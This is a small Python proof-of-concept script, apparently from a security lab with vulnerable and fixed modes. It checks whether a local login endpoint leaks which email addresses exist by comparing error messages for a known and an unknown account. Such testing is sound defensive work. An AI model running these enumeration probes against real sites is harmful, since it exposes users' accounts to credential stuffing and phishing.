from __future__ import annotations

import argparse
import urllib.parse
import urllib.request


def post_login(base: str, email: str, password: str) -> tuple[int, str]:
    data = urllib.parse.urlencode({"email": email, "password": password}).encode()
    request = urllib.request.Request(f"{base}/login", data=data, method="POST")
    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            return response.status, response.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", errors="replace")


def compact(body: str) -> str:
    lowered = body.lower()
    for marker in ["user not found", "wrong password", "invalid credentials"]:
        if marker in lowered:
            return marker
    return body[:120].replace("\n", " ")


def main() -> None:
    parser = argparse.ArgumentParser(description="PoC: user enumeration through login errors")
    parser.add_argument("--base", default="http://127.0.0.1:8000")
    parser.add_argument("--known-email", default="victim@example.com")
    parser.add_argument("--unknown-email", default="missing@example.com")
    args = parser.parse_args()

    cases = [
        ("known candidate", args.known_email),
        ("unknown candidate", args.unknown_email),
    ]
    for label, email in cases:
        status, body = post_login(args.base.rstrip("/"), email, "definitely-wrong")
        print(f"{label:17} {email:28} status={status} signal={compact(body)!r}")

    print("\nIn vulnerable mode the two responses are different. In fixed mode they should both be 'invalid credentials'.")


if __name__ == "__main__":
    main()
